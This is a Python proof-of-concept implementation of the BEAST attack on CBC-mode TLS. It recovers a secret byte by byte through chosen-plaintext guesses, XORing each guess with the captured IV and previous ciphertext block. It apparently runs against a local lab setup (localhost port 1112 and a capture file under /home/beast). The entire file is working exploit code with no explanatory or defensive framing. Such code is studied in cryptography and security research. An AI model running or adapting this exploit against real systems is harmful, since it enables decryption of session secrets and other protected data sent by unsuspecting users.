import os
import time
import socket
import threading
import ssl
import binascii
from struct import *


def split_len(seq, length):
    return [seq[i:i + length] for i in range(0, len(seq), length)]


class Beast:
    client_host = 'localhost'
    client_port = 1112
    length_block = 16
    start_exploit = False
    length_frame = 0
    vector_init = ''
    previous_cipher = ''
    frame = ''


    def connection(self):
        # Initialization of the client
        ssl_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock.connect((self.client_host, self.client_port))
        ssl_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.socket = ssl_sock
        return
      

    def request_send(self, prefix=0, data=0):
        if data == 0:
            data = prefix * "#"
        try:
            self.socket.sendall(data)
        except ssl.SSLError:
            pass
        pass
        return


    def disconnect(self):
        self.socket.close()
        return
      

    def run(self):
        print("Start decrypting the request...\n")
        secret = []
        i_know = "_"
        padding = self.length_block - len(i_know) - 1
        i_know = "#" * padding + i_know
        add_byte = self.length_block
        t = 0
        while (t < 16):
            for i in range(1, 256):
                self.start_exploit = True
                self.connection()
                self.request_send(add_byte + padding)
                time.sleep(0.06)
                with open("/home/beast/beast/tmp.txt", "r") as file:
                    data_ = file.read()
                self.set_length_frame(data_)
                self.alter()
                original = split_len(binascii.hexlify(self.frame), 32)
                self.start_exploit = False
                p_guess = i_know + chr(i)
                xored = self.xor_block(p_guess, i)
                self.request_send(add_byte + padding, xored)
                time.sleep(0.06)
                with open("/home/beast/beast/tmp.txt", "r") as file:
                    data_ = file.read()
                self.set_length_frame(data_)
                self.alter()
                result = split_len(binascii.hexlify(self.frame), 32)
                if result[1] == original[2]:
                    print("Find char " + chr(i) + " after " + str(i) + " tries")
                    i_know = p_guess[1:]
                    add_byte = add_byte - 1
                    secret.append(chr(i))
                    t = t + 1
                    break
        secret = ''.join(secret)
        print("\nthe secret is " + secret)
        self.disconnect()
        return

    def alter(self):
        if self.start_exploit is True:
            self.frame = bytearray(self.frame)
            self.vector_init = str(self.frame[-self.length_block:])
            self.request_send(0, 'set_vector_init' + self.vector_init)
            time.sleep(0.01)
            self.previous_cipher = str(self.frame[self.length_block:self.length_block * 2])
            return str(self.frame)
        return self.frame

    def xor_strings(self, xs, ys, zs):
        return "".join(chr(ord(x) ^ ord(y) ^ ord(z)) for x, y, z in zip(xs, ys, zs))

    def xor_block(self, p_guess, i):
        xored = self.xor_strings(self.vector_init, self.previous_cipher, p_guess)
        return xored

    def set_length_frame(self, data):
        self.frame = data
        self.length_frame = len(data)


if __name__ == '__main__':
    try:
        beast = Beast()
        beast.run()
    except KeyboardInterrupt:
        beast.disconnect()
 
